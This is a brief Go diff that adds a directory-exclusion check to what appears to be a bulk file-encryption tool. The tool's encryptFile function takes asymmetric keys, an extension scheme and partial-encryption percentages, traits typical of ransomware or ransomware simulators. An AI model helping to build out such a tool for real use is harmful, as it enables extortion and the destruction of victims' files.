@@ -353,6 +353,14 @@ func shouldProcessFile(f string, config *Config) bool {
 
 }
 
+func shouldProcessDirectory(d string, config *Config) bool {
+	baseDirectory := strings.ToLower(filepath.Base(d))
+	if slices.Contains(config.DirectoryExclusions, baseDirectory) {
+		return false
+	}
+	return true
+}
+
 func encryptFile(file File, method string, extension string, extensionMethod string, asymHandler AsymKeyHandler, cipher string, encryptThreshold int64, encryptPercentage int) {
 	printFormattedMessage(fmt.Sprintf("Encrypting: "+file.Path), INFO)
 
